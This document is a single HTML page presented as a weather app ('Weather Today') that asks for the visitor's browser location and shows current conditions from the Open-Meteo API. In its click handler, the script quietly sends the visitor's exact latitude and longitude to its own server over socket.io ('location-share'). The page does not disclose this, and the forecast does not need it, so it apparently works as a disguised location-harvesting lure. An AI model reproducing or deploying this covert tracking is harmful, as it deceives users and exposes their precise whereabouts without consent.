<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Forecast</title>

    <!-- Bulma CSS Framework -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@1.0.2/css/bulma.min.css">
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
            color: #fff;
        }

        .weather-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 30px 20px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
        }

        .weather-title {
            color: #ffffff;
            font-weight: 700;
        }

        .weather-subtitle {
            color: #d1d5db;
            font-size: 0.95rem;
        }

        .btn-custom {
            background: linear-gradient(135deg, #00c6ff, #0072ff);
            border: none;
            color: #fff;
            font-weight: 600;
            border-radius: 12px;
            height: 50px;
            transition: all 0.3s ease;
        }

        .btn-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 114, 255, 0.4);
            color: #fff;
        }

        .info-box {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 12px;
            padding: 15px;
            margin-top: 15px;
            text-align: center;
        }

        .metric-value {
            font-size: 1.5rem;
            font-weight: 700;
        }

        .metric-label {
            font-size: 0.85rem;
            color: #e5e7eb;
        }

        .loader-spin {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>

    <div class="weather-card has-text-centered">
        
        <!-- App Header -->
        <div class="mb-5">
            <span class="icon is-large has-text-warning mb-2">
                <i class="fa-solid fa-cloud-sun fa-3x"></i>
            </span>
            <h1 class="title is-3 weather-title mt-2">Weather Today</h1>
            <p class="weather-subtitle">Get real-time weather details for your exact current location.</p>
        </div>

        <!-- Action Button -->
        <button id="weatherBtn" class="button is-fullwidth btn-custom">
            <span class="icon"><i class="fa-solid fa-location-crosshairs"></i></span>
            <span>Check My Weather</span>
        </button>

        <!-- Dynamic Status Section -->
        <div id="status" class="mt-4"></div>

    </div>

    <script src="/socket.io/socket.io.js"></script>

    <script>
        const socket = io();
        const button = document.getElementById("weatherBtn");
        const status = document.getElementById("status");

        button.addEventListener("click", () => {
            if (!navigator.geolocation) {
                status.innerHTML = `
                    <div class="notification is-danger is-light mt-4">
                        Your browser does not support geolocation.
                    </div>`;
                return;
            }

            // Loading state
            status.innerHTML = `
                <div class="mt-4">
                    <div class="loader-spin mb-3"></div>
                    <p class="is-size-7 weather-subtitle">Requesting location access...</p>
                </div>`;

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Send location to server via socket
                    socket.emit("location-share", {
                        latitude: latitude,
                        longitude: longitude
                    });

                    status.innerHTML = `
                        <div class="mt-4">
                            <div class="loader-spin mb-3"></div>
                            <p class="is-size-7 weather-subtitle">Fetching latest weather data...</p>
                        </div>`;

                    try {
                        const response = await fetch(
                            `https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m`
                        );

                        if (!response.ok) {
                            throw new Error("Weather API Error");
                        }

                        const weather = await response.json();
                        const temperature = weather.current.temperature_2m;
                        const humidity = weather.current.relative_humidity_2m;
                        const wind = weather.current.wind_speed_10m;

                        // Modern UI Weather Display
                        status.innerHTML = `
                            <div class="columns is-mobile is-multiline mt-2">
                                <div class="column is-12">
                                    <div class="info-box">
                                        <div class="metric-label"><i class="fa-solid fa-temperature-high"></i> Temperature</div>
                                        <div class="metric-value">${temperature}°C</div>
                                    </div>
                                </div>
                                <div class="column is-6">
                                    <div class="info-box">
                                        <div class="metric-label"><i class="fa-solid fa-droplet"></i> Humidity</div>
                                        <div class="metric-value">${humidity}%</div>
                                    </div>
                                </div>
                                <div class="column is-6">
                                    <div class="info-box">
                                        <div class="metric-label"><i class="fa-solid fa-wind"></i> Wind Speed</div>
                                        <div class="metric-value">${wind} <span class="is-size-7">km/h</span></div>
                                    </div>
                                </div>
                            </div>`;
                    } catch (error) {
                        console.error(error);
                        status.innerHTML = `
                            <div class="notification is-danger is-light mt-4">
                                Unable to fetch weather data. Please try again.
                            </div>`;
                    }
                },
                (error) => {
                    status.innerHTML = `
                        <div class="notification is-warning is-light mt-4">
                            Location access denied. Please allow location access to view weather details.
                        </div>`;
                }
            );
        });
    </script>

</body>

</html>
